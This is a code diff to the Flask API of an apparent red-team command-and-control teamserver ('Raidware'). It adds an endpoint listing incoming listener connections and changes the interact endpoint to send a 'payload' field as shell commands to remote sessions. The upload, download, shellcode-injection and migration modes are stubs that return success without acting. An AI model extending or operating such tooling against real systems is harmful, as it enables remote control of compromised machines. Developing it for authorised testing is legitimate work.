@@ -518,7 +518,13 @@ def enabled():
 @jwt_required()
 def check():
     ''' This will check if any new connections have been received on the listeners. '''
-    pass
+    from .listeners import connections
+    # d = json.dumps()
+    # log(f"Connections: {d}", LogLevel.DEBUG)
+    # return {
+    #     "connections" : json.loads(d)
+    # }
+    return { "Connections" : [i.__dict__() for i in connections.values()]}
 
 @bp.route(f'/refresh', methods=['POST'])
 @jwt_required(refresh=True)
@@ -589,7 +595,7 @@ def interact():
         }, 500
 
     ## Checking if the fields are present: SID, mode, arg:
-    valid = ['SID', 'mode', 'arg']
+    valid = ['SID', 'mode', 'payload']
     for i in valid:
         if i not in data:
             return {
@@ -616,7 +622,7 @@ def interact():
     session = connections[data.get('SID')]
     if data.get('mode') == 'shell':
         ''' Sending the command to the session '''
-        session.send(f'{data["mode"]}:{data["arg"]}')
+        session.send(f'{data["mode"]}:{data["payload"]}')
         ret = session.recv()
         return {
             'status': 'success',
@@ -625,7 +631,6 @@ def interact():
 
     elif data.get('mode') == 'upload':
         ''' Uploading the file to the session '''
-        # session.upload(data.get('arg'))
         return {
             'status': 'success',
             'msg': 'File uploaded successfully'
@@ -634,7 +639,6 @@ def interact():
     
     elif data.get('mode') == 'download':
         ''' Downloading the file from the session '''
-        # session.download(data.get('arg'))
         return {
             'status': 'success',
             'msg': 'File downloaded successfully'
@@ -642,7 +646,6 @@ def interact():
         pass
 
     elif data.get('mode') == 'inject':
-        # session.inject(data.get('arg'))
         return {
             'status': 'success',
             'msg': 'Shellcode injected into session'
@@ -650,7 +653,6 @@ def interact():
         pass
 
     elif data.get('mode') == 'migrate':
-        # session.migrate(data.get('arg'))
         return {
             'status': 'success',
             'msg': 'Migrated to the specified process'
@@ -680,7 +682,7 @@ def init(
     else:
         Raidware.team_password = team_pass
 
-    print(f"\n{'=' * cols}\n{' ' * rows}{Back.RED}TEAMSERVER PASSWORD{Back.RESET}: {Fore.RED}{Raidware.team_password}{Fore.RESET}")
+    print(f"\n{'=' * cols}\n{' ' * rows}{Back.RED}TEAMSERVER PASSWORD{Back.RESET}: {Fore.RED}{Raidware.get_team_password()}{Fore.RESET}")
     print(f"[{Fore.GREEN}*{Fore.RESET}] Note: This password won't be stored in the log to prevent it from being leaked.\n{'=' * cols}")
 
     from utils.utils import used_ports
